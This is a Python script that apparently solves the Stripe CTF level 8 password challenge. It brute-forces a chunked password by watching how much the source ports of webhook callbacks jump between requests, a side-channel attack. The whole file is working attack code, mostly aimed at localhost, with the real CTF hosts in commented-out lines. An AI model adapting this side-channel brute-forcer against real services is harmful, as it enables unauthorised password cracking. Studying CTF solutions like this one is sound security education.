#import httplib
import urllib2
import json
import random
import socket
import threading
import Queue

#WEBHOOK_HOST = 'level02-4.stripe-ctf.com%s'
#WEBHOOK_BIND = '10.0.1.136'
WEBHOOK_HOST = 'localhost%s'
WEBHOOK_BIND = 'localhost'
#PASSWORDDB_ADDR = 'https://level08-3.stripe-ctf.com/user-vsnmtyplfo/'
PASSWORDDB_ADDR = 'http://localhost:9091'

EXPECTED_PORT_OFFSET = 4

sock_q = Queue.Queue()
port_q = Queue.Queue()
log_q = Queue.Queue()

def zero_pad_string(strnum):
    while len(strnum) < 3:
        strnum = "0%s" % strnum
    return strnum

class CTFMachine:
    
    def __init__(self):
        # self.rs = httplib.HTTPSConnection(PASSWORDDB_ADDR)
        # self.rs.debuglevel = 0
        # self.rs.putrequest('POST', PASSWORDDB_PATH)
        # self.rs.putheader('Connection','Keep-Alive')
        # self.rs.endheaders()

        #initialize logging thread
        # self.logthread = threading.Thread(target=self.logging_concurrent)
        # self.logthread.start()

        self.chunks = ['000', '000', '000', '000']

    def logging_concurrent(self):
        while 1:
            try:
                print log_q.get(False)
            except:
                """ """


    def get_password(self, override_index=None, override_chunk=None):
        chunks = self.chunks
        if override_index is not None:
            chunks[override_index] = override_chunk
        return "".join(map(str, chunks))

    def send_request(self, password):
        #start listener
        webhook_sock = sock_q.get(True)
        t = threading.Thread(target=self.webhook_get_port, args=(webhook_sock,))
        t.start()
        hookurl = "%s" % WEBHOOK_HOST
        hookurl = hookurl % (":" + str(webhook_sock.getsockname()[1]))
        payload = {"password": password, "webhooks": [hookurl]}
        #self.rs.send(json.dumps(payload))
        #r = self.rs.getresponse()
        try:
            r = urllib2.urlopen(PASSWORDDB_ADDR, json.dumps(payload))
            #print json.dumps(payload)
            response_data = r.read()
            #print response_data
            #if r.status == 200:
            while t.is_alive():
                t.join(1)
                #print 'joining'
            return json.loads(response_data)['success']

            
        except Exception, e:
            print "BROKEN"
            print e
            print r.info()
            print r.read()
            exit()

    def webhook_get_port(self, sock):
        #log_q.put(sock)
        sock.listen(5)
        #log_q.put('listening on port %s' % sock.getsockname()[1])
        client, address = sock.accept()
        client.close()
        port_q.put(address[1])
        exit()

    def brute_chunk(self, chunk_index):
        chunk_val = 0 #int(self.chunks[chunk_index])
        while chunk_val <= 999:
            success = False
            password = self.get_password(chunk_index, zero_pad_string(str(chunk_val)))

            print password

            #find 3 bind-able ports and put them on the socket queue
            for sockcount in range(1,4):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                #s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                breakout = False
                while not breakout:
                    try:
                        webhook_port = random.randrange(1025, 65534)
                        s.bind((WEBHOOK_BIND, webhook_port))
                        #print "bound to %s" % webhook_port
                        breakout = True
                    except Exception, e:
                        #print e
                        """print "webhook bind to %s failed. retrying." % webhook_port"""
                sock_q.put(s)
                s = None

            self.send_request(password)
            self.send_request(password)
            winrar = self.send_request(password)

            port1 = port_q.get(True)
            port2 = port_q.get(True)
            port3 = port_q.get(True)

            diff1 = (port2 - port1) - EXPECTED_PORT_OFFSET
            diff2 = (port3 - port2) - EXPECTED_PORT_OFFSET
            #print "diff1=%s, diff2=%s" % (diff1, diff2)
            print "jitter1: %s; jitter2: %s;" % (diff1, diff2)
            if (diff1 == (chunk_index + 1)) and (diff2 == (chunk_index + 1)):
                success = True

            if winrar:
                valid_chunk = zero_pad_string(str(chunk_val))
                self.chunks[chunk_index] = valid_chunk
                print "holy shit we win! flag is %s" % self.get_password()
                exit()
            if success:
                break
            else:
                chunk_val = chunk_val + 1
        valid_chunk = zero_pad_string(str(chunk_val))
        self.chunks[chunk_index] = valid_chunk
        return valid_chunk


lol = CTFMachine()
for x in range(0, 3):
    prev = ''
    comp = False
    while not comp:
        c = lol.brute_chunk(x)
        if c == prev:
            comp = True
            print "chunk %s verified." % x
        else:
            prev = c
            print "verification failed for chunk %s. retrying." % x

success = False
chunk_val = -1
while not success:
    chunk_val = chunk_val + 1
    password = lol.get_password(3, zero_pad_string(str(chunk_val)))
    print password
    payload = {"password": password, "webhooks": []}
    r = urllib2.urlopen(PASSWORDDB_ADDR, json.dumps(payload))
    response_data = r.read()
    success = json.loads(response_data)['success']
